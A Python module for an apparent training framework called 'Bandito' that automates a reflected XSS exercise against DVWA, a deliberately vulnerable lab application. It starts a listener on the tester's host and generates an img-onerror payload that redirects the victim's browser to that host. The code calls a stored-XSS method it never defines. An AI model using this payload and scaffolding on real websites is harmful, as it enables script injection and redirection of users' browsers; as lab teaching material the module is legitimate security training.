from base_module import BaseModule
from utils import colored
import subprocess
import webbrowser
import os
import socket

class DVWAXSS(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dvwa_xss"
        self.description = "DVWA Reflected & Stored XSS (Parts 3)"

        self.options = {
            "RHOST": {"value": "", "required": True, "description": "Target DVWA IP or URL"},
            "LHOST": {"value": self.get_local_ip(), "required": True, "description": "Your Kali IP for HTTP server"},
            "LPORT": {"value": "8080", "required": True, "description": "HTTP server port to catch redirect/cookies"},
        }

        self.server_process = None

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def show_options(self):
        print(colored(f"\nModule options ({self.name}):", "orange"))


        option_rows = []
        for name, data in self.options.items():
            value = str(data.get("value", ""))
            required = "yes" if data.get("required") else "no"
            desc = data.get("description", "")
            option_rows.append((name, value, required, desc))

 
        name_width   = max(15, max(len(row[0]) for row in option_rows) + 2)
        value_width  = max(30, max(len(row[1]) for row in option_rows) + 2)
        req_width    = max(10, max(len(row[2]) for row in option_rows) + 2)
 

        # Header
        header = f"{'Name':<{name_width}} {'Current Setting':<{value_width}} {'Required':<{req_width}} Description"
        print(colored(header, "yellow"))
        print("-" * (name_width + value_width + req_width + 40))

        # Rows
        for name, value, required, desc in option_rows:

            value_str = value[:value_width-3] + "..." if len(value) > value_width-3 else value
            print(f"{name:<{name_width}} {colored(value_str, 'green'):<{value_width}} {colored(required, 'red'):<{req_width}} {desc}")

    def show_help(self):
        print(colored("\n=== DVWA XSS Module (Parts 3 & 4) ===", "orange"))
        print("This module supports both Reflected and Stored XSS")
        print("Commands:")
        print("  setup              - Start HTTP server + open reflected XSS page")
        print("  generate_reflected - Generate reflected XSS payload")
        print("  set <option> <value> - Set RHOST, LHOST, LPORT")
        print("  show options       - Show current settings")
        print("  help               - Show this help")
        print("  back / exit        - Return to framework (stops server)\n")
        print("For Part 3 (Reflected): use 'generate_reflected'")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: set <option> <value>")
                return
            option = parts[1].upper()
            value = parts[2]

            if option in self.options:
                self.options[option]["value"] = value
                print(colored(f"{option} → {value}", "green"))
            else:
                print(colored(f"Unknown option: {option}", "red"))
            return

        if low == "setup":
            self.start_http_server()
            self.open_reflected_xss_page()
            return

        if low == "generate_reflected":
            self.generate_reflected()
            return

        if low == "generate_stored":
            self.generate_stored()
            return

        if low in ["back", "exit", "quit"]:
            if self.server_process:
                print(colored("[*] Stopping HTTP server...", "yellow"))
                self.server_process.terminate()
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def start_http_server(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        print(colored(f"[*] Starting HTTP server on http://{lhost}:{lport}", "yellow"))

        cmd = f"python3 -m http.server {lport}"
        try:
            self.server_process = subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd + "; echo 'HTTP server running - press Enter to close...'; read"])
            print(colored("[+] HTTP server started in new terminal", "green"))
        except:
            try:
                self.server_process = subprocess.Popen(["xterm", "-e", cmd])
                print(colored("[+] HTTP server started in xterm", "green"))
            except:
                print(colored("[-] Could not open new terminal. Run manually:", "red"))
                print(f"    {cmd}")

    def open_reflected_xss_page(self):
        rhost = self.options["RHOST"]["value"]
        url = f"http://{rhost}/vulnerabilities/xss_r/"
        print(colored(f"[+] Opening DVWA Reflected XSS page: {url}", "yellow"))
        webbrowser.open(url)

        print(colored("\nIMPORTANT:", "orange"))
        print("  If the page shows the login screen instead of the XSS form:")
        print("  1. Log in manually with admin / password")
        print("  2. After login, navigate to: Vulnerabilities → Reflected XSS")
        print("  3. Paste the payload from 'generate_reflected' and submit")
        print("The framework cannot auto-login in your browser for security reasons.\n")

    def generate_reflected(self):
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        payload = f'<img src=x onerror="window.location=\'http://{lhost}:{lport}/xss_test\'">'

        print(colored("\n=== Reflected XSS Payload (Part 3) ===", "orange"))
        print("Paste this into the 'What's your name?' field → Submit")
        print(colored("="*80, "yellow"))
        print(payload)
        print(colored("="*80, "yellow"))

        try:
            subprocess.run(["xclip", "-sel", "clip"], input=payload.encode(), check=True)
            print(colored("[+] Payload copied to clipboard!", "green"))
        except:
            print(colored("[+] Copy the payload above manually", "yellow"))

        print(colored(f"\nAfter submit, check HTTP server terminal for incoming GET /xss_test", "yellow"))
